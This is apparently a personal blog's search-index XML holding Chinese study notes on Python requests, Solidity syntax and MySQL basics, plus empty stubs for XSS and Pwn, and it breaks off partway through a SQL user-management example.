<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python与网页交互学习</title>
      <link href="/2025/04/09/requests%E5%BA%93BeautifulSoup%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/04/09/requests%E5%BA%93BeautifulSoup%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Python与网页交互"><a href="#Python与网页交互" class="headerlink" title="Python与网页交互"></a>Python与网页交互</h1><h2 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h2><ol><li><p><strong>发送get请求：</strong></p><p>使用Requests库发送GET请求非常简单。你只需要使用<code>requests.get()</code>函数，并传入目标URL即可。下面是一个简单的示例：</p></li></ol><p><img src="https://pic1.imgdb.cn/item/67f65a5f88c538a9b5c7bdd6.png" alt=""></p><ol><li><p><strong>发送post请求：</strong></p><p>与GET请求类似，发送POST请求也非常简单。你只需要使用<code>requests.post()</code>函数，并传入目标URL和要提交的数据即可。下面是一个简单的示例：</p><p><img src="https://pic1.imgdb.cn/item/67f65a8688c538a9b5c7bde2.png" alt=""></p></li><li><p><strong>请求头和请求体：</strong></p><p>在发送HTTP请求时，除了URL以外，还可以设置请求头和请求体。请求头用于传递一些额外的信息给服务器，比如用户代理、授权信息等。请求体则用于向服务器提交数据，比如表单数据、JSON数据等。在这一部分，我们将详细说明如何设置请求头和请求体，并解释它们的作用。</p><p><strong>设置请求头：</strong></p><p><img src="https://pic1.imgdb.cn/item/67f65b4988c538a9b5c7be24.png" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity学习日志01</title>
      <link href="/2025/03/31/Solidity%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%971/"/>
      <url>/2025/03/31/Solidity%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%971/</url>
      
        <content type="html"><![CDATA[<h1 id="Solidity笔记01篇"><a href="#Solidity笔记01篇" class="headerlink" title="Solidity笔记01篇"></a>Solidity笔记01篇</h1><h2 id="版本声明"><a href="#版本声明" class="headerlink" title="版本声明"></a><strong>版本声明</strong></h2><p>在 Solidity 中，代码文件通常以版本声明开头，指定编译器的版本范围：</p><p>solidity复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0; // 表示使用 Solidity 0.8.0 或更高版本</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a><strong>数据类型</strong></h2><p>Solidity 支持多种数据类型，包括：</p><ul><li><strong>布尔值</strong>：<code>bool</code>（<code>true</code> 或 <code>false</code>）</li><li><strong>整数</strong>：<code>uint</code>（无符号整数）和 <code>int</code>（有符号整数），如 <code>uint256</code>、<code>int8</code></li><li><strong>地址</strong>：<code>address</code>（存储以太坊地址）</li><li><strong>字符串</strong>：<code>string</code></li><li><strong>字节</strong>：<code>bytes</code>（动态长度的字节数组）和 <code>bytes32</code>（固定长度的字节数组）</li><li><strong>数组</strong>：<code>uint[]</code>（动态数组）和 <code>uint[3]</code>（固定长度数组）</li><li><strong>映射</strong>：<code>mapping(keyType =&gt; valueType)</code>（类似字典）</li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h2><p>变量可以是状态变量（存储在区块链上）或局部变量（仅在函数中有效）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 状态变量uint256 public myNumber = 10;// 局部变量function addNumbers(uint256 a, uint256 b) public pure returns (uint256) &#123;uint256 sum = a + b;return sum;&#125;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a><strong>函数</strong></h2><p>函数可以定义为：</p><ul><li><code>public</code>：任何地方都可以调用</li><li><code>private</code>：仅在合约内部调用</li><li><code>external</code>：仅从合约外部调用</li><li><code>internal</code>：仅在合约内部调用</li><li><code>view</code>：不修改状态变量</li><li><code>pure</code>：不读取或修改状态变量</li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function multiply(uint256 a, uint256 b) public pure returns (uint256) &#123;return a * b;&#125;</span><br></pre></td></tr></table></figure><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a><strong>事件</strong></h2><p>事件用于记录合约中的重要操作，可以通过日志查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);function transfer(address to, uint256 value) public &#123;emit Transfer(msg.sender, to, value);&#125;</span><br></pre></td></tr></table></figure><h2 id="合约"><a href="#合约" class="headerlink" title="合约"></a><strong>合约</strong></h2><p>合约是 Solidity 的核心，用于定义智能合约的逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract MyContract &#123;uint256 public myNumber;constructor(uint256 initialNumber) &#123;</span><br><span class="line">        myNumber = initialNumber;&#125;function updateNumber(uint256 newNumber) public &#123;</span><br><span class="line">        myNumber = newNumber;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a><strong>控制结构</strong></h2><p>Solidity 支持常见的控制结构：</p><ul><li><strong>条件语句</strong>：</li><li>solidity复制</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (condition) &#123;// 代码块&#125; else if (anotherCondition) &#123;// 代码块&#125; else &#123;// 代码块&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>循环</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; 10; i++) &#123;// 代码块&#125;while (condition) &#123;// 代码块&#125;</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a><strong>继承</strong></h2><p>合约可以继承其他合约的功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract Parent &#123;function foo() public pure virtual returns (string memory) &#123;return &quot;Parent&quot;;&#125;&#125;contract Child is Parent &#123;function foo() public pure override returns (string memory) &#123;return &quot;Child&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="修改器"><a href="#修改器" class="headerlink" title="修改器"></a><strong>修改器</strong></h2><p>修改器用于在函数执行前后添加逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyOwner() &#123;require(msg.sender == owner, &quot;Not owner&quot;);_; // 表示继续执行函数&#125;function withdraw() public onlyOwner &#123;// 仅合约所有者可以调用&#125;</span><br></pre></td></tr></table></figure><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a><strong>错误处理</strong></h2><p>使用 <code>require</code>、<code>assert</code> 和 <code>revert</code> 进行错误处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(x &gt;= 0, &quot;x must be positive&quot;); // 条件不满足时回退assert(y &gt; 0); // 内部错误检查revert(&quot;Error message&quot;); // 明确回退</span><br></pre></td></tr></table></figure><h2 id="示例合约"><a href="#示例合约" class="headerlink" title="示例合约"></a><strong>示例合约</strong></h2><p>以下是一个简单的代币合约示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SimpleToken &#123;string public name = &quot;MyToken&quot;;uint256 public totalSupply;mapping(address =&gt; uint256) public balances;event Transfer(address indexed from, address indexed to, uint256 value);constructor(uint256 initialSupply) &#123;</span><br><span class="line">        totalSupply = initialSupply;</span><br><span class="line">        balances[msg.sender] = initialSupply;&#125;function transfer(address to, uint256 value) public &#123;require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        balances[to] += value;emit Transfer(msg.sender, to, value);&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习笔记</title>
      <link href="/2025/03/31/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/03/31/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS学习笔记"><a href="#XSS学习笔记" class="headerlink" title="XSS学习笔记"></a>XSS学习笔记</h1>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-从入门到精通</title>
      <link href="/2025/03/31/pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A01/"/>
      <url>/2025/03/31/pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A01/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwn-从入门到精通"><a href="#Pwn-从入门到精通" class="headerlink" title="Pwn-从入门到精通"></a>Pwn-从入门到精通</h1><p>【由于主要路线在学习Misc和Web，因此此部分的学习内容比较少，在空闲时间或者知识缓冲期会进行Pwn方向的学习。】</p><p>ps：文章不定期更新，跟进学习进度。。。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql数据库基础学习</title>
      <link href="/2025/03/31/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/03/31/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql学习日志（基础篇）"><a href="#Mysql学习日志（基础篇）" class="headerlink" title="Mysql学习日志（基础篇）"></a>Mysql学习日志（基础篇）</h1><p>【[痛苦过后，便是那几乎重生的蜕变!只不过，蜕变的过程，需要痛苦的考验来酝酿!                        ——《斗破苍穹》】</p><h2 id="数据库相关概念"><a href="#数据库相关概念" class="headerlink" title="数据库相关概念"></a>数据库相关概念</h2><p><strong>数据库：</strong>DataBase（DB），存储数据的仓库，数据是有组织的进行存储。</p><p><strong>数据库管理系统：</strong>DataBase Management System（DBMS），操纵和管理数据库的大型软件</p><p><strong>SQL：</strong>Structured Query Language（SQL），操作关系型数据库的编程语言，定义了一套操作关系型数据库统一标准</p><p><img src="https://pic1.imgdb.cn/item/67eb5b2f0ba3d5a1d7e8cbb5.png" alt=""></p><h2 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h2><p><strong>关系型数据库：</strong>建立在关系模型基础上，由多张相互相互连接的二维表组成的数据库。</p><p>特点：</p><ol><li>使用表存储数据，格式统一，便于维护。</li><li>使用SQL语言操作，标准统一，使用方便。</li></ol><h2 id="SQL语言基础"><a href="#SQL语言基础" class="headerlink" title="SQL语言基础"></a>SQL语言基础</h2><h3 id="SQL通用语法："><a href="#SQL通用语法：" class="headerlink" title="SQL通用语法："></a>SQL通用语法：</h3><ol><li><p>SQL语句可以单行或多行书写，以分号结尾。</p></li><li><p>SQL语句可以使用空格/缩进来增强语句的可读性。</p></li><li><p>MySQL数据库的SQL语句不区分大小写，关键字建议使用大写</p></li><li><p>注释： </p><p>单行注释：<code>-- 注释内容 或 # 注释内容（MySQL特有）</code></p><p>多行注释：<code>/*注释内容*/</code></p></li></ol><h3 id="SQL分类："><a href="#SQL分类：" class="headerlink" title="SQL分类："></a>SQL分类：</h3><p><img src="https://pic1.imgdb.cn/item/67eb73e40ba3d5a1d7e8f2e2.png" alt=""></p><h2 id="DDL-数据库操作"><a href="#DDL-数据库操作" class="headerlink" title="DDL-数据库操作"></a>DDL-数据库操作</h2><p><strong>查询</strong></p><p>查询所有数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br></pre></td></tr></table></figure><p>查询当前数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASES();</span><br></pre></td></tr></table></figure><p><strong>创建</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE [IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] 数据库名 [<span class="keyword">DEFAULT</span> CHARSET字符集] [<span class="keyword">COLLATE</span> 排序规则];</span><br></pre></td></tr></table></figure><p><strong>删除</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE[IF <span class="keyword">EXISTS</span>]数据库名;</span><br></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE 数据库名;</span><br></pre></td></tr></table></figure><h3 id="DDL-表操作-查询"><a href="#DDL-表操作-查询" class="headerlink" title="DDL-表操作-查询"></a>DDL-表操作-查询</h3><p>查询当前数据库的所有表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure><p>查询表结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DESC</span> 表名;</span><br></pre></td></tr></table></figure><p>查询指定表的建表语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE TABLE</span> 表名;</span><br></pre></td></tr></table></figure><h3 id="DDL-表操作-创建"><a href="#DDL-表操作-创建" class="headerlink" title="DDL-表操作-创建"></a>DDL-表操作-创建</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> 表名(</span><br><span class="line">字段<span class="number">1</span> 字段<span class="number">1</span>类型[COMMENT 字段<span class="number">1</span>注释],</span><br><span class="line">    字段<span class="number">2</span> 字段<span class="number">2</span>类型[COMMENT 字段<span class="number">2</span>注释],</span><br><span class="line">    字段<span class="number">3</span> 字段<span class="number">3</span>类型[COMMENT 字段<span class="number">3</span>注释],</span><br><span class="line">    ……</span><br><span class="line">    字段n 字段n类型[COMMENT 字段n注释]</span><br><span class="line">)[COMMENT 表注释];</span><br></pre></td></tr></table></figure><h3 id="DDL-表操作-数据类型"><a href="#DDL-表操作-数据类型" class="headerlink" title="DDL-表操作-数据类型"></a>DDL-表操作-数据类型</h3><p>MySQL中的数据类型有很多，主要分为三类：数值类型，字符串类型，日期时间类型</p><p><strong>数值类型：</strong></p><p><img src="https://pic1.imgdb.cn/item/67eb79670ba3d5a1d7e8f445.png" alt=""></p><p><strong>字符串类型：</strong></p><p><img src="https://pic1.imgdb.cn/item/67eb79960ba3d5a1d7e8f455.png" alt=""></p><p><strong>日期类型：</strong></p><p><img src="https://pic1.imgdb.cn/item/67eb79b70ba3d5a1d7e8f457.png" alt=""></p><h3 id="DDL-表操作-修改"><a href="#DDL-表操作-修改" class="headerlink" title="DDL-表操作-修改"></a>DDL-表操作-修改</h3><p>添加字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> 表名 <span class="keyword">ADD</span> 字段名 类型（长度） [COMMENT 注释] [约束];</span><br></pre></td></tr></table></figure><p>修改数据类型：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> 表名 MODIFY 字段名 新数据类型（长度）;</span><br></pre></td></tr></table></figure><p>修改字段和字段类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> 表名 CHANGE 旧字段名 新字段名 类型（长度） [COMMENT 注释] [约束];</span><br></pre></td></tr></table></figure><p>删除字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> 表名 <span class="keyword">DROP</span> 字段名;</span><br></pre></td></tr></table></figure><p>修改表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> 表名 RENAME <span class="keyword">TO</span> 新表名;</span><br></pre></td></tr></table></figure><h3 id="DDL-表操作-删除"><a href="#DDL-表操作-删除" class="headerlink" title="DDL-表操作-删除"></a>DDL-表操作-删除</h3><p>删除表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span>[IF <span class="keyword">EXISTS</span>] 表名;</span><br></pre></td></tr></table></figure><p>删除指定表，并重新创建该表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> 表名;</span><br></pre></td></tr></table></figure><p>(注意：在删除表时，表中的全部数据也会被删除)</p><h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><p><strong>介绍：</strong></p><p>DML英文全称是Data Manipulation Language（数据操作语言），用来对数据库中表的数据记录进行增删改操作</p><ol><li>添加数据：INSERT</li><li>修改数据：UPDATE</li><li>删除数据：DELETE</li></ol><h3 id="DML-添加数据"><a href="#DML-添加数据" class="headerlink" title="DML-添加数据"></a>DML-添加数据</h3><ol><li>给指定字段添加数据：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> 表名(字段名<span class="number">1</span>,字段名<span class="number">2</span>,....) <span class="keyword">VALUES</span>(值<span class="number">1</span>,值<span class="number">2</span>, ...);</span><br></pre></td></tr></table></figure><ol><li>给全部字段添加数据：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> 表名 <span class="keyword">VALUES</span>(值<span class="number">1</span>,值<span class="number">2</span>, ...);</span><br></pre></td></tr></table></figure><ol><li>批量添加数据：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> 表名(字段名<span class="number">1</span>,字段名<span class="number">2</span>, ...) <span class="keyword">VALUES</span>(值<span class="number">1</span>,值<span class="number">2</span>,...),(值<span class="number">1</span>,值<span class="number">2</span>,...),(值<span class="number">1</span>,值<span class="number">2</span>,...);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> 表名 <span class="keyword">VALUES</span>(值<span class="number">1</span>,值<span class="number">2</span>,...),(值<span class="number">1</span>,值<span class="number">2</span>,...),(值<span class="number">1</span>,值<span class="number">2</span>,...);</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol><li>插入数据时，指定的字段顺序需要与值的顺序是一一对应的。</li><li>字符串和日期型数据应该包含在引导中。</li><li>插入的数据大小，应该在字段的规定范围内</li></ol><h3 id="DML-修改数据"><a href="#DML-修改数据" class="headerlink" title="DML-修改数据"></a>DML-修改数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 字段名<span class="number">1</span> <span class="operator">=</span> 值<span class="number">1</span>, 字段名<span class="number">2</span> <span class="operator">=</span> 值<span class="number">2</span>, ....[<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>修改语句的条件可以有，也可以没有，没有时会修改整张表的所有数据</p><h3 id="DML-删除数据"><a href="#DML-删除数据" class="headerlink" title="DML-删除数据"></a>DML-删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol><li>DELETE语句的条件可以有，也可以没有，没有时会删除整张表的所有数据</li><li>DELETE语句不能删除某一个字段的值（可以使用UPDATE）</li></ol><h2 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h2><p>DQL，全称Data Query Language（数据查询语言），数据查询语言，用来查询数据库中的记录</p><p>查询关键字：SELECT</p><h3 id="DQL语法："><a href="#DQL语法：" class="headerlink" title="DQL语法："></a>DQL语法：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">字段列表</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">表名列表</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">条件列表</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">分组字段列表</span><br><span class="line"><span class="keyword">HAVING</span></span><br><span class="line">分组后条件列表</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">分页列表</span><br></pre></td></tr></table></figure><h3 id="DQL-基本查询"><a href="#DQL-基本查询" class="headerlink" title="DQL-基本查询"></a>DQL-基本查询</h3><ol><li>查询多个字段</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span>，字段<span class="number">2</span>，字段<span class="number">3.</span>..<span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><ol><li>设置别名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span> [<span class="keyword">AS</span> 别名<span class="number">1</span>],字段<span class="number">2</span> [<span class="keyword">AS</span> 别名<span class="number">2</span>] ... <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><ol><li>去除重复记录</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 字段列表 <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><h3 id="DQL-条件查询"><a href="#DQL-条件查询" class="headerlink" title="DQL-条件查询"></a>DQL-条件查询</h3><ol><li>语法</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> 条件列表;</span><br></pre></td></tr></table></figure><ol><li>条件</li></ol><p><img src="https://pic1.imgdb.cn/item/67eb87c70ba3d5a1d7e8f904.png" alt=""></p><h3 id="DQL-聚合函数"><a href="#DQL-聚合函数" class="headerlink" title="DQL-聚合函数"></a>DQL-聚合函数</h3><ol><li>介绍：</li></ol><p>将一列数据作为一个整体，进行纵向计算</p><ol><li>常见聚合函数：</li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">count</td><td style="text-align:center">统计数量</td></tr><tr><td style="text-align:center">max</td><td style="text-align:center">最大值</td></tr><tr><td style="text-align:center">min</td><td style="text-align:center">最小值</td></tr><tr><td style="text-align:center">avg</td><td style="text-align:center">平均值</td></tr><tr><td style="text-align:center">sum</td><td style="text-align:center">求和</td></tr></tbody></table></div><ol><li>语法：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 聚合函数(字段列表) <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><h3 id="DQL-分组查询"><a href="#DQL-分组查询" class="headerlink" title="DQL-分组查询"></a>DQL-分组查询</h3><ol><li>语法</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件] <span class="keyword">GROUP</span> <span class="keyword">BY</span> 分组字段名 [<span class="keyword">HAVING</span> 分组后过滤条件];</span><br></pre></td></tr></table></figure><ol><li>where和having的区别：</li></ol><p>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组之后对结果进行过滤</p><p>判断时机不同：where不能对聚合函数进行判断，但having可以。</p><p><strong>注意：</strong></p><p>执行顺序： where&gt;聚合函数&gt;having</p><p>分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义。</p><h3 id="DQL-排序查询"><a href="#DQL-排序查询" class="headerlink" title="DQL-排序查询"></a>DQL-排序查询</h3><ol><li>语法</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段<span class="number">1</span> 排序方式<span class="number">1</span>,字段<span class="number">2</span> 排序方式<span class="number">2</span>;</span><br></pre></td></tr></table></figure><ol><li>排序方式：</li></ol><p>ASC：升序（默认值）</p><p>DESC：降序</p><p><strong>注意：</strong>如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序</p><h3 id="DQL-分页查询"><a href="#DQL-分页查询" class="headerlink" title="DQL-分页查询"></a>DQL-分页查询</h3><ol><li>语法</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 LIMIT 起始索引,查询记录数</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>起始索引从0开始，起始索引= （查询页码-1）* 每页显示记录数</li><li>分页查询是数据库的方言，不同数据库有不同的实现，MySQL中是LIMIT</li><li>如果查询的是第一页数据，起始索引可以省略，直接简写为limit 10.</li></ul><h2 id="DCL-管理用户"><a href="#DCL-管理用户" class="headerlink" title="DCL-管理用户"></a>DCL-管理用户</h2><ol><li>查询用户</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure><ol><li>创建用户</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span>;</span><br></pre></td></tr></table></figure><ol><li>修改用户密码</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="keyword">WITH</span>  